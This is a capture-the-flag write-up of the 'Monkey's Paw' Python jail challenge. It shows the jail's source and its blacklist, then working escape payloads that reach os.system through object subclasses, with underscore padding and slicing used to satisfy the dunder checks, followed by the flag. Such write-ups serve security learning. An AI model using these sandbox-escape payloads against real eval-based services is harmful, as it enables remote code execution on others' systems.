# Misc

<!-- challenge-index: 33592a7ebbd7564f -->

| Challenge | Topic |
| --- | --- |
| [Monkey's Paw (384 pts)](#monkeys-paw-384-pts) | Python Jail |

<!-- /challenge-index -->

## Monkey's Paw (384 pts)

### Description

I wish these modern pyjails would let me use dunders more..

### Solution

This challenge is pyjail and the objective is finding the way to do RCE on server through bypassing some blacklist.

<pre class="language-python" data-line-numbers><code class="lang-python">#!/usr/local/bin/python3.13 -S

def die():
    print("Don't be greedy")
    exit(1)


def check_code(code):
    to_check = ["co_consts", "co_names",
                "co_varnames", "co_freevars", "co_cellvars"]
    for attr in to_check:
        for obj in getattr(code, attr):
<strong>            if type(obj) is not str or \
</strong><strong>                    len(obj) &#x3C; 5 or \
</strong><strong>                    obj[:2] + obj[-2:] != '____':
</strong>                die()


code = input("Be careful what you wish for: ")
<strong>if "\"'" in code:
</strong>    die()

code = compile(code, "&#x3C;string>", "eval")
check_code(code)
<strong>eval(code, {'__builtins__': {}})
</strong></code></pre>

There are total 5 protection implemented in the code, below is the details (simplified explanation)

* Line 13: The value other then function or attribute can only be string (we can't use integer etc)
* Line 14: The length of all the values should be greater than 4
* Line 15: The value must be consist of \_\_ in the start and in the end
* Line 20: We cannot use the exact `"'` values
* Line 25: builtins functions are removed&#x20;

My teammate (daffainfo) send the payload that would be work without the blacklist (1-4).

```python
"().__class__.__base__.__subclasses__()[116].__init__.__builtins__['__import__']('os').__getattribute__('system')('ls')"
```

My task is converting the payload to make it work with the blacklist. Here is the bypass idea&#x20;

* To get the integer value we can use \_\_len\_\_()&#x20;
* To use string values that dont have "\_\_" we can use padding and indext subscribe

And below is the converted payload

* do `ls`

```python
__builtins__.__class__.__base__.__subclasses__()["____________________________________________________________________________________________________________________".__len__()].__init__.__builtins__['__import__']('______os_____'["______".__len__():"________".__len__()]).__getattribute__('______system_____'["______".__len__():"____________".__len__()])('______ls_____'["______".__len__():"________".__len__()])
```

* do `cat flag_RRkxxMoAAG3mQpoq.txt`

```python
__builtins__.__class__.__base__.__subclasses__()["____________________________________________________________________________________________________________________".__len__()].__init__.__builtins__['__import__']('______os_____'["______".__len__():"________".__len__()]).__getattribute__('______system_____'["______".__len__():"____________".__len__()])('______cat flag_RRkxxMoAAG3mQpoq.txt_____'["______".__len__():"___________________________________".__len__()])
```

<figure><img src="https://329253018-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FIYUhWFsdATjBxpgp6f6z%2Fuploads%2FHtqmROjoIkv8e2bggLL7%2Fimage.png?alt=media&amp;token=cea1b332-8d2f-458b-af9c-51caf26c9849" alt=""><figcaption></figcaption></figure>

Flag: INTIGRITI{y0ur\_w15h\_w45\_6r4n73d\_bu7\_47\_wh47\_c057}
